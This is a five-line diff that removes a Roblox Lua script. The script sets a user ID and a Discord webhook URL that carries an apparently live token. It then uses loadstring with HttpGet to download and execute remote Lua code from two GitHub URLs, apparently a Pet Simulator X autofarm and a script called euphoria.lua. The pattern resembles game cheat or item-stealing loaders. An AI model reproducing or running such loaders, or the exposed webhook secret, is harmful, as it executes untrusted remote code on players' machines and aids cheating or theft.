@@ -1,5 +1,0 @@
-_G.UserID = 4169245068
-_G.WebHook = "https://discord.com/api/webhooks/1056479681668456518/hblhZjYxhcChnCxE26N7npu4_6X5sUsAreGGreB5mRULHvhCe_UvF9hgP0qif2X3eJ_5"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
-wait(5)
-loadstring(game:HttpGet("https://github.com/HazeNx/shimbo/raw/main/euphoria.lua"))()
